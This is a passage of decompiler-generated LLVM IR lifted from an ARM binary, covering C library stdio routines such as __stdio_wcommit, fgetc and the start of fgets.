  %v3_15b14 = add i32 %v0_15b14, 4
  %v4_15b14 = inttoptr i32 %v3_15b14 to i32*
  %v5_15b14 = load i32, i32* %v4_15b14, align 4
  store i32 %v5_15b14, i32* %r1.global-to-local, align 4
  %v6_15b14 = add i32 %v0_15b14, 8
  %v7_15b14 = inttoptr i32 %v6_15b14 to i32*
  %v8_15b14 = load i32, i32* %v7_15b14, align 4
  store i32 %v8_15b14, i32* %r2.global-to-local, align 4
  %v1_15b1c = load i32, i32* %r5.global-to-local, align 4
  %v2_15b1c = add i32 %v1_15b1c, 52
  %v3_15b1c = inttoptr i32 %v2_15b1c to i32*
  store i32 1, i32* %v3_15b1c, align 4
  %v0_15b20 = load i32, i32* %r5.global-to-local, align 4
  %v1_15b20 = add i32 %v0_15b20, 56
  store i32 %v1_15b20, i32* %r3.global-to-local, align 4
  %v2_15b24 = load i32, i32* %r0.global-to-local, align 4
  %v1_15b28 = inttoptr i32 %v1_15b20 to i32*
  store i32 %v2_15b24, i32* %v1_15b28, align 4
  %v3_15b28 = add i32 %v0_15b20, 60
  %v4_15b28 = inttoptr i32 %v3_15b28 to i32*
  %v5_15b28 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_15b28, i32* %v4_15b28, align 4
  %v6_15b28 = add i32 %v0_15b20, 64
  %v7_15b28 = inttoptr i32 %v6_15b28 to i32*
  %v8_15b28 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_15b28, i32* %v7_15b28, align 4
  %v0_15b2c = load i32, i32* %r5.global-to-local, align 4
  %v1_15b2c = add i32 %v0_15b2c, 32
  %v2_15b2c = inttoptr i32 %v1_15b2c to i32*
  %v3_15b2c = load i32, i32* %v2_15b2c, align 4
  store i32 %v3_15b2c, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15b30 = icmp eq i32 %v3_15b2c, 0
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_15b38 = add i32 %v3_15b2c, 56
  store i32 %v1_15b38, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br i1 %v2_15b30, label %dec_label_pc_15b44, label %dec_label_pc_15aa8

dec_label_pc_15b44:                               ; preds = %.thread10, %entry
  store i32 76, i32* %r3.global-to-local, align 4
  %v0_15b48 = load i32, i32* %r7.global-to-local, align 4
  %v2_15b48 = add i32 %v0_15b48, 76
  %v3_15b48 = inttoptr i32 %v2_15b48 to i32*
  %v4_15b48 = load i32, i32* %v3_15b48, align 4
  store i32 %v4_15b48, i32* %r3.global-to-local, align 4
  %storemerge.in11 = inttoptr i32 %v4_15b48 to i32*
  %storemerge12 = load i32, i32* %storemerge.in11, align 4
  store i32 %storemerge12, i32* %r4.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15b6814 = icmp eq i32 %storemerge12, 0
  br i1 %v2_15b6814, label %dec_label_pc_15b70, label %dec_label_pc_15b54

dec_label_pc_15b54:                               ; preds = %dec_label_pc_15b44, %dec_label_pc_15b68
  %v1_15b5c = phi i32 [ %storemerge, %dec_label_pc_15b68 ], [ %storemerge12, %dec_label_pc_15b44 ]
  %v1_15b54 = inttoptr i32 %v1_15b5c to i16*
  %v2_15b54 = load i16, i16* %v1_15b54, align 2
  %v3_15b54 = zext i16 %v2_15b54 to i32
  store i32 %v3_15b54, i32* %r3.global-to-local, align 4
  %v1_15b58 = and i32 %v3_15b54, 64
  %v2_15b58 = icmp eq i32 %v1_15b58, 0
  br i1 %v2_15b58, label %dec_label_pc_15b68, label %bb39

bb39:                                             ; preds = %dec_label_pc_15b54
  store i32 %v1_15b5c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15b68

dec_label_pc_15b68:                               ; preds = %dec_label_pc_15b54, %bb39
  %v1_15b60 = xor i1 %v2_15b58, true
  call void @__pseudo_cond_branch(i1 %v1_15b60, i32 ptrtoint (i32* @global_var_15b98.617 to i32))
  %v0_15b64 = load i32, i32* %r4.global-to-local, align 4
  %v1_15b64 = add i32 %v0_15b64, 32
  %storemerge.in = inttoptr i32 %v1_15b64 to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r4.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15b68 = icmp eq i32 %storemerge, 0
  br i1 %v2_15b68, label %dec_label_pc_15b70, label %dec_label_pc_15b54

dec_label_pc_15b70:                               ; preds = %dec_label_pc_15b68, %dec_label_pc_15b44
  %v2_15b74 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_15b74, i32* %r4.global-to-local, align 4
  %v1_15b78 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_15b78

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v3_15b2c, { 1, 2, 3, 0 }
  uselistorder i32 %v1_15acc, { 1, 0 }
  uselistorder i32 %v4_15a8c, { 2, 1, 0 }
  uselistorder i32 %v4_15a5c, { 2, 1, 0 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 3, 4, 5, 6, 7, 8, 10, 1, 11, 9, 12 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 3, 4, 1, 5, 6, 7 }
  uselistorder i32* %r2.global-to-local, { 4, 0, 1, 2, 3, 12, 13, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1, 10, 11, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r0.global-to-local, { 4, 0, 1, 2, 3, 9, 5, 6, 7, 8 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 6, 5, 1, 2, 3, 4, 7 }
  uselistorder label %dec_label_pc_15b68, { 1, 0 }
  uselistorder label %dec_label_pc_15b54, { 1, 0 }
  uselistorder label %.thread10, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15aec, { 1, 0 }
  uselistorder label %dec_label_pc_15ac8, { 1, 0 }
  uselistorder label %dec_label_pc_15aa8, { 1, 0 }
}

define i32 @__stdio_wcommit(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15b98 = load i32, i32* @r4, align 4
  store i32 %v3_15b98, i32* %stack_var_-8, align 4
  %v1_15b9c = add i32 %arg1, 8
  %v2_15b9c = inttoptr i32 %v1_15b9c to i32*
  %v3_15b9c = load i32, i32* %v2_15b9c, align 4
  store i32 %v3_15b9c, i32* @r1, align 4
  %v1_15ba0 = add i32 %arg1, 16
  %v2_15ba0 = inttoptr i32 %v1_15ba0 to i32*
  %v3_15ba0 = load i32, i32* %v2_15ba0, align 4
  %v9_15ba4 = icmp eq i32 %v3_15ba0, %v3_15b9c
  store i32 %arg1, i32* %r4.global-to-local, align 4
  br i1 %v9_15ba4, label %bb3, label %bb

bb:                                               ; preds = %entry
  store i32 %v3_15b9c, i32* %v2_15ba0, align 4
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v1_15bb0 = xor i1 %v9_15ba4, true
  call void @__pseudo_cond_branch(i1 %v1_15bb0, i32 ptrtoint (i32* @global_var_17588.618 to i32))
  %v0_15bb4 = load i32, i32* %r4.global-to-local, align 4
  %v1_15bb4 = add i32 %v0_15bb4, 8
  %v2_15bb4 = inttoptr i32 %v1_15bb4 to i32*
  %v3_15bb4 = load i32, i32* %v2_15bb4, align 4
  %v1_15bb8 = add i32 %v0_15bb4, 16
  %v2_15bb8 = inttoptr i32 %v1_15bb8 to i32*
  %v3_15bb8 = load i32, i32* %v2_15bb8, align 4
  %v2_15bbc = sub i32 %v3_15bb8, %v3_15bb4
  %v2_15bc0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_15bc0, i32* @r4, align 4
  ret i32 %v2_15bbc

; uselistorder directives
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__GI_fgetc(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_15bc8 = load i32, i32* @r4, align 4
  store i32 %v3_15bc8, i32* %stack_var_-20, align 4
  %v6_15bc8 = load i32, i32* @r5, align 4
  %v9_15bc8 = load i32, i32* @r6, align 4
  %v12_15bc8 = load i32, i32* @r7, align 4
  %v15_15bc8 = load i32, i32* @lr, align 4
  %v1_15bcc = add i32 %arg1, 52
  %v2_15bcc = inttoptr i32 %v1_15bcc to i32*
  %v3_15bcc = load i32, i32* %v2_15bcc, align 4
  store i32 %v3_15bcc, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15bd0 = icmp eq i32 %v3_15bcc, 0
  store i32 %arg1, i32* @r7, align 4
  br i1 %v2_15bd0, label %dec_label_pc_15c04, label %dec_label_pc_15be0

dec_label_pc_15be0:                               ; preds = %entry
  %v1_15be0 = add i32 %arg1, 16
  %v2_15be0 = inttoptr i32 %v1_15be0 to i32*
  %v3_15be0 = load i32, i32* %v2_15be0, align 4
  store i32 %v3_15be0, i32* %r2.global-to-local, align 4
  %v1_15be4 = add i32 %arg1, 24
  %v2_15be4 = inttoptr i32 %v1_15be4 to i32*
  %v3_15be4 = load i32, i32* %v2_15be4, align 4
  store i32 %v3_15be4, i32* %r3.global-to-local, align 4
  %v3_15be8 = icmp uge i32 %v3_15be0, %v3_15be4
  store i1 %v3_15be8, i1* %cpsr_c.global-to-local, align 1
  br i1 %v3_15be8, label %dec_label_pc_15bf8, label %.thread

.thread:                                          ; preds = %dec_label_pc_15be0
  %v2_15bec = inttoptr i32 %v3_15be0 to i8*
  %v3_15bec = load i8, i8* %v2_15bec, align 1
  %v4_15bec = zext i8 %v3_15bec to i32
  store i32 %v4_15bec, i32* %r5.global-to-local, align 4
  %v6_15bec = add i32 %v3_15be0, 1
  store i32 %v6_15bec, i32* %r2.global-to-local, align 4
  store i32 %v6_15bec, i32* %v2_15be0, align 4
  br label %dec_label_pc_15cfc

dec_label_pc_15bf8:                               ; preds = %dec_label_pc_15be0
  %v1_15bf8 = inttoptr i32 %arg1 to i16*
  %v2_15bf8 = call i32 @getc_unlocked(i16* %v1_15bf8)
  store i32 %v2_15bf8, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_15cfc

dec_label_pc_15c04:                               ; preds = %entry
  %v0_15c04 = call i32 @__aeabi_read_tp()
  %v0_15c08 = load i32, i32* @r7, align 4
  %v1_15c08 = add i32 %v0_15c08, 64
  %v2_15c08 = inttoptr i32 %v1_15c08 to i32*
  %v3_15c08 = load i32, i32* %v2_15c08, align 4
  store i32 %v3_15c08, i32* %r3.global-to-local, align 4
  %v1_15c0c = add i32 %v0_15c04, -1168
  store i32 %v1_15c0c, i32* @r6, align 4
  %v3_15c10 = icmp uge i32 %v3_15c08, %v1_15c0c
  store i1 %v3_15c10, i1* %cpsr_c.global-to-local, align 1
  %v9_15c10 = icmp eq i32 %v3_15c08, %v1_15c0c
  br i1 %v9_15c10, label %dec_label_pc_15c58, label %dec_label_pc_15c18

dec_label_pc_15c18:                               ; preds = %dec_label_pc_15c04
  %v1_15c18 = add i32 %v0_15c08, 56
  store i32 %v1_15c18, i32* @r5, align 4
  store i32 %v1_15c18, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15c24

dec_label_pc_15c24:                               ; preds = %dec_label_pc_15c30.dec_label_pc_15c24_crit_edge, %dec_label_pc_15c18
  %v0_15c24 = phi i32 [ %v0_15c24.pre, %dec_label_pc_15c30.dec_label_pc_15c24_crit_edge ], [ %v1_15c18, %dec_label_pc_15c18 ]
  %v1_15c24 = inttoptr i32 %v0_15c24 to i32*
  %v2_15c24 = load i32, i32* %v1_15c24, align 4
  store i32 %v2_15c24, i32* %r3.global-to-local, align 4
  %v1_15c28 = load i32, i32* @r4, align 4
  %v3_15c28 = icmp uge i32 %v2_15c24, %v1_15c28
  store i1 %v3_15c28, i1* %cpsr_c.global-to-local, align 1
  %v9_15c28 = icmp eq i32 %v2_15c24, %v1_15c28
  br i1 %v9_15c28, label %dec_label_pc_15c30, label %dec_label_pc_15c48

dec_label_pc_15c30:                               ; preds = %dec_label_pc_15c24
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15c40 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15c40, label %dec_label_pc_15c44, label %dec_label_pc_15c30.dec_label_pc_15c24_crit_edge

dec_label_pc_15c30.dec_label_pc_15c24_crit_edge:  ; preds = %dec_label_pc_15c30
  %v0_15c24.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15c24

dec_label_pc_15c44:                               ; preds = %dec_label_pc_15c30
  %v0_15c44 = load i32, i32* @r4, align 4
  store i32 %v0_15c44, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15c48

dec_label_pc_15c48:                               ; preds = %dec_label_pc_15c24, %dec_label_pc_15c44
  %v0_15c48 = phi i32 [ %v0_15c44, %dec_label_pc_15c44 ], [ %v2_15c24, %dec_label_pc_15c24 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15c48 = icmp eq i32 %v0_15c48, 0
  br i1 %v2_15c48, label %bb18, label %bb

bb:                                               ; preds = %dec_label_pc_15c48
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_15c48, %bb
  store i32 89172, i32* @lr, align 4
  %v1_15c50 = xor i1 %v2_15c48, true
  call void @__pseudo_cond_branch(i1 %v1_15c50, i32 ptrtoint (i32* @global_var_13a2c.496 to i32))
  %v0_15c54 = load i32, i32* @r6, align 4
  %v1_15c54 = load i32, i32* @r7, align 4
  %v2_15c54 = add i32 %v1_15c54, 64
  %v3_15c54 = inttoptr i32 %v2_15c54 to i32*
  store i32 %v0_15c54, i32* %v3_15c54, align 4
  %v0_15c58.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_15c58

dec_label_pc_15c58:                               ; preds = %dec_label_pc_15c04, %bb18
  %v1_15c68 = phi i32 [ %v0_15c08, %dec_label_pc_15c04 ], [ %v0_15c58.pre, %bb18 ]
  %v1_15c58 = add i32 %v1_15c68, 60
  %v2_15c58 = inttoptr i32 %v1_15c58 to i32*
  %v3_15c58 = load i32, i32* %v2_15c58, align 4
  store i32 %v3_15c58, i32* %r2.global-to-local, align 4
  %v1_15c5c = add i32 %v1_15c68, 16
  %v2_15c5c = inttoptr i32 %v1_15c5c to i32*
  %v3_15c5c = load i32, i32* %v2_15c5c, align 4
  store i32 %v3_15c5c, i32* @r1, align 4
  %v1_15c60 = add i32 %v1_15c68, 24
  %v2_15c60 = inttoptr i32 %v1_15c60 to i32*
  %v3_15c60 = load i32, i32* %v2_15c60, align 4
  store i32 %v3_15c60, i32* %r3.global-to-local, align 4
  %v1_15c64 = add i32 %v3_15c58, 1
  store i32 %v1_15c64, i32* %r2.global-to-local, align 4
  store i32 %v1_15c64, i32* %v2_15c58, align 4
  %v0_15c6c = load i32, i32* @r1, align 4
  %v1_15c6c = load i32, i32* %r3.global-to-local, align 4
  %v3_15c6c = icmp uge i32 %v0_15c6c, %v1_15c6c
  store i1 %v3_15c6c, i1* %cpsr_c.global-to-local, align 1
  br i1 %v3_15c6c, label %dec_label_pc_15c7c, label %.thread2

.thread2:                                         ; preds = %dec_label_pc_15c58
  %v2_15c70 = inttoptr i32 %v0_15c6c to i8*
  %v3_15c70 = load i8, i8* %v2_15c70, align 1
  %v4_15c70 = zext i8 %v3_15c70 to i32
  store i32 %v4_15c70, i32* %r5.global-to-local, align 4
  %v6_15c70 = add i32 %v0_15c6c, 1
  store i32 %v6_15c70, i32* @r1, align 4
  %v2_15c74 = load i32, i32* @r7, align 4
  %v3_15c74 = add i32 %v2_15c74, 16
  %v4_15c74 = inttoptr i32 %v3_15c74 to i32*
  store i32 %v6_15c70, i32* %v4_15c74, align 4
  br label %dec_label_pc_15c88

dec_label_pc_15c7c:                               ; preds = %dec_label_pc_15c58
  %v0_15c7c = load i32, i32* @r7, align 4
  %v1_15c80 = inttoptr i32 %v0_15c7c to i16*
  %v2_15c80 = call i32 @getc_unlocked(i16* %v1_15c80)
  store i32 %v2_15c80, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_15c88

dec_label_pc_15c88:                               ; preds = %.thread2, %dec_label_pc_15c7c
  %v0_15c88 = load i32, i32* @r7, align 4
  %v1_15c88 = add i32 %v0_15c88, 60
  %v2_15c88 = inttoptr i32 %v1_15c88 to i32*
  %v3_15c88 = load i32, i32* %v2_15c88, align 4
  %v1_15c8c = add i32 %v3_15c88, -1
  store i32 %v1_15c8c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15c90 = icmp eq i32 %v1_15c8c, 0
  store i32 %v1_15c8c, i32* %v2_15c88, align 4
  br i1 %v2_15c90, label %dec_label_pc_15c9c, label %dec_label_pc_15cfc

dec_label_pc_15c9c:                               ; preds = %dec_label_pc_15c88
  %v0_15c9c = load i32, i32* %r3.global-to-local, align 4
  %v1_15c9c = load i32, i32* @r7, align 4
  %v2_15c9c = add i32 %v1_15c9c, 64
  %v3_15c9c = inttoptr i32 %v2_15c9c to i32*
  store i32 %v0_15c9c, i32* %v3_15c9c, align 4
  %v0_15ca0 = load i32, i32* @r7, align 4
  %v1_15ca0 = add i32 %v0_15ca0, 56
  store i32 %v1_15ca0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15ca4

dec_label_pc_15ca4:                               ; preds = %dec_label_pc_15cd4.dec_label_pc_15ca4_crit_edge, %dec_label_pc_15c9c
  %v0_15cac = phi i32 [ %v0_15cac.pre, %dec_label_pc_15cd4.dec_label_pc_15ca4_crit_edge ], [ %v1_15ca0, %dec_label_pc_15c9c ]
  %v0_15ca4 = phi i32 [ %v0_15ca4.pre, %dec_label_pc_15cd4.dec_label_pc_15ca4_crit_edge ], [ %v0_15ca0, %dec_label_pc_15c9c ]
  %v1_15ca4 = add i32 %v0_15ca4, 56
  %v2_15ca4 = inttoptr i32 %v1_15ca4 to i32*
  %v3_15ca4 = load i32, i32* %v2_15ca4, align 4
  store i32 %v3_15ca4, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_15cac, i32* %r2.global-to-local, align 4
  %v1_15cb022 = inttoptr i32 %v0_15cac to i32*
  %v2_15cb023 = load i32, i32* %v1_15cb022, align 4
  store i32 %v2_15cb023, i32* %r3.global-to-local, align 4
  %v3_15cb425 = icmp uge i32 %v2_15cb023, %v3_15ca4
  store i1 %v3_15cb425, i1* %cpsr_c.global-to-local, align 1
  %v9_15cb431 = icmp eq i32 %v2_15cb023, %v3_15ca4
  br i1 %v9_15cb431, label %dec_label_pc_15cbc, label %dec_label_pc_15cd4

dec_label_pc_15cbc:                               ; preds = %dec_label_pc_15ca4, %dec_label_pc_15cbc.dec_label_pc_15cb0_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15ccc = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15ccc, label %dec_label_pc_15cd0, label %dec_label_pc_15cbc.dec_label_pc_15cb0_crit_edge

dec_label_pc_15cbc.dec_label_pc_15cb0_crit_edge:  ; preds = %dec_label_pc_15cbc
  %v0_15cb0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15cb4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_15cb0 = inttoptr i32 %v0_15cb0.pre to i32*
  %v2_15cb0 = load i32, i32* %v1_15cb0, align 4
  store i32 %v2_15cb0, i32* %r3.global-to-local, align 4
  %v3_15cb4 = icmp uge i32 %v2_15cb0, %v1_15cb4.pre
  store i1 %v3_15cb4, i1* %cpsr_c.global-to-local, align 1
  %v9_15cb4 = icmp eq i32 %v2_15cb0, %v1_15cb4.pre
  br i1 %v9_15cb4, label %dec_label_pc_15cbc, label %dec_label_pc_15cd4

dec_label_pc_15cd0:                               ; preds = %dec_label_pc_15cbc
  %v0_15cd0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_15cd0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15cd4

dec_label_pc_15cd4:                               ; preds = %dec_label_pc_15ca4, %dec_label_pc_15cbc.dec_label_pc_15cb0_crit_edge, %dec_label_pc_15cd0
  %v0_15cdc = phi i32 [ %v0_15cd0, %dec_label_pc_15cd0 ], [ %v2_15cb023, %dec_label_pc_15ca4 ], [ %v2_15cb0, %dec_label_pc_15cbc.dec_label_pc_15cb0_crit_edge ]
  %v1_15cd4 = phi i32 [ %v0_15cd0, %dec_label_pc_15cd0 ], [ %v3_15ca4, %dec_label_pc_15ca4 ], [ %v1_15cb4.pre, %dec_label_pc_15cbc.dec_label_pc_15cb0_crit_edge ]
  %v3_15cd4 = icmp uge i32 %v0_15cdc, %v1_15cd4
  store i1 %v3_15cd4, i1* %cpsr_c.global-to-local, align 1
  %v9_15cd4 = icmp eq i32 %v0_15cdc, %v1_15cd4
  br i1 %v9_15cd4, label %dec_label_pc_15cdc, label %dec_label_pc_15cd4.dec_label_pc_15ca4_crit_edge

dec_label_pc_15cd4.dec_label_pc_15ca4_crit_edge:  ; preds = %dec_label_pc_15cd4
  %v0_15ca4.pre = load i32, i32* @r7, align 4
  %v0_15cac.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15ca4

dec_label_pc_15cdc:                               ; preds = %dec_label_pc_15cd4
  %v2_15cdc = icmp ne i32 %v1_15cd4, 0
  store i1 %v2_15cdc, i1* %cpsr_c.global-to-local, align 1
  %v7_15ce0 = icmp slt i32 %v1_15cd4, 2
  br i1 %v7_15ce0, label %dec_label_pc_15cfc, label %dec_label_pc_15ce4

dec_label_pc_15ce4:                               ; preds = %dec_label_pc_15cdc
  %v0_15ce8 = load i32, i32* @r1, align 4
  %v1_15ce8 = add i32 %v0_15ce8, 129
  store i32 %v1_15ce8, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15cfc

dec_label_pc_15cfc:                               ; preds = %.thread, %dec_label_pc_15c88, %dec_label_pc_15ce4, %dec_label_pc_15cdc, %dec_label_pc_15bf8
  %v0_15cfc = load i32, i32* %r5.global-to-local, align 4
  %v2_15d04 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_15d04, i32* @r4, align 4
  store i32 %v6_15bc8, i32* @r5, align 4
  store i32 %v9_15bc8, i32* @r6, align 4
  store i32 %v12_15bc8, i32* @r7, align 4
  store i32 %v15_15bc8, i32* @lr, align 4
  ret i32 %v0_15cfc

; uselistorder directives
  uselistorder i32 %v0_15cd0, { 1, 0, 2 }
  uselistorder i32 %v1_15cb4.pre, { 0, 2, 1 }
  uselistorder i32 %v0_15c6c, { 1, 0, 2 }
  uselistorder i32 %v1_15c68, { 0, 2, 1 }
  uselistorder i32 %v1_15c28, { 1, 0 }
  uselistorder i32 %v3_15be0, { 1, 0, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 2, 13, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 2, 11, 12, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 %arg1, { 0, 3, 2, 4, 1 }
  uselistorder label %dec_label_pc_15cfc, { 2, 3, 1, 4, 0 }
  uselistorder label %dec_label_pc_15cd4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15cbc, { 1, 0 }
  uselistorder label %dec_label_pc_15c88, { 1, 0 }
  uselistorder label %dec_label_pc_15c58, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %dec_label_pc_15c48, { 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_15d0c = load i32, i32* @r4, align 4
  store i32 %v3_15d0c, i32* %stack_var_-32, align 4
  %v6_15d0c = load i32, i32* @r5, align 4
  %v9_15d0c = load i32, i32* @r6, align 4
  %v12_15d0c = load i32, i32* @r7, align 4
  %v15_15d0c = load i32, i32* @r8, align 4
  %v24_15d0c = load i32, i32* @lr, align 4
  %v1_15d10 = add i32 %arg3, 52
  %v2_15d10 = inttoptr i32 %v1_15d10 to i32*
  %v3_15d10 = load i32, i32* %v2_15d10, align 4
  store i32 %v3_15d10, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15d14 = icmp eq i32 %v3_15d10, 0
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg1, i32* %sl.global-to-local, align 4
  store i32 %arg2, i32* %sb.global-to-local, align 4
  br i1 %v2_15d14, label %dec_label_pc_15d28, label %dec_label_pc_15d8c

dec_label_pc_15d28:                               ; preds = %entry
  %v0_15d28 = call i32 @__aeabi_read_tp()
  %v1_15d2c = add i32 %arg3, 64
  %v2_15d2c = inttoptr i32 %v1_15d2c to i32*
  %v3_15d2c = load i32, i32* %v2_15d2c, align 4
  store i32 %v3_15d2c, i32* %r3.global-to-local, align 4
  %v1_15d30 = add i32 %v0_15d28, -1168
  store i32 %v1_15d30, i32* @r8, align 4
  %v3_15d34 = icmp uge i32 %v3_15d2c, %v1_15d30
  store i1 %v3_15d34, i1* %cpsr_c.global-to-local, align 1
  %v9_15d34 = icmp eq i32 %v3_15d2c, %v1_15d30
  br i1 %v9_15d34, label %dec_label_pc_15d80, label %dec_label_pc_15d3c

dec_label_pc_15d3c:                               ; preds = %dec_label_pc_15d28
  %v1_15d3c = add i32 %arg3, 56
  store i32 %v1_15d3c, i32* @r5, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v1_15d3c, i32* %r2.global-to-local, align 4
  %v0_15d48 = load i32, i32* @r6, align 4
  store i32 %v0_15d48, i32* @r4, align 4
  %v1_15d4c36 = inttoptr i32 %v1_15d3c to i32*
  %v2_15d4c37 = load i32, i32* %v1_15d4c36, align 4
  store i32 %v2_15d4c37, i32* %r3.global-to-local, align 4
  %v3_15d5039 = icmp uge i32 %v2_15d4c37, %v0_15d48
  store i1 %v3_15d5039, i1* %cpsr_c.global-to-local, align 1
  %v9_15d5045 = icmp eq i32 %v2_15d4c37, %v0_15d48
  br i1 %v9_15d5045, label %dec_label_pc_15d58, label %dec_label_pc_15d70

dec_label_pc_15d58:                               ; preds = %dec_label_pc_15d3c, %dec_label_pc_15d58.dec_label_pc_15d4c_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15d68 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15d68, label %dec_label_pc_15d6c, label %dec_label_pc_15d58.dec_label_pc_15d4c_crit_edge

dec_label_pc_15d58.dec_label_pc_15d4c_crit_edge:  ; preds = %dec_label_pc_15d58
  %v0_15d4c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15d50.pre = load i32, i32* @r4, align 4
  %v1_15d4c = inttoptr i32 %v0_15d4c.pre to i32*
  %v2_15d4c = load i32, i32* %v1_15d4c, align 4
  store i32 %v2_15d4c, i32* %r3.global-to-local, align 4
  %v3_15d50 = icmp uge i32 %v2_15d4c, %v1_15d50.pre
  store i1 %v3_15d50, i1* %cpsr_c.global-to-local, align 1
  %v9_15d50 = icmp eq i32 %v2_15d4c, %v1_15d50.pre
  br i1 %v9_15d50, label %dec_label_pc_15d58, label %dec_label_pc_15d70

dec_label_pc_15d6c:                               ; preds = %dec_label_pc_15d58
  %v0_15d6c = load i32, i32* @r4, align 4
  store i32 %v0_15d6c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15d70

dec_label_pc_15d70:                               ; preds = %dec_label_pc_15d3c, %dec_label_pc_15d58.dec_label_pc_15d4c_crit_edge, %dec_label_pc_15d6c
  %v0_15d70 = phi i32 [ %v0_15d6c, %dec_label_pc_15d6c ], [ %v2_15d4c37, %dec_label_pc_15d3c ], [ %v2_15d4c, %dec_label_pc_15d58.dec_label_pc_15d4c_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15d70 = icmp eq i32 %v0_15d70, 0
  br i1 %v2_15d70, label %bb20, label %bb

bb:                                               ; preds = %dec_label_pc_15d70
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_15d70, %bb
  store i32 89468, i32* @lr, align 4
  %v1_15d78 = xor i1 %v2_15d70, true
  call void @__pseudo_cond_branch(i1 %v1_15d78, i32 ptrtoint (i32* @global_var_13a2c.496 to i32))
  %v0_15d7c = load i32, i32* @r8, align 4
  %v1_15d7c = load i32, i32* @r7, align 4
  %v2_15d7c = add i32 %v1_15d7c, 64
  %v3_15d7c = inttoptr i32 %v2_15d7c to i32*
  store i32 %v0_15d7c, i32* %v3_15d7c, align 4
  br label %dec_label_pc_15d80

dec_label_pc_15d80:                               ; preds = %dec_label_pc_15d28, %bb20
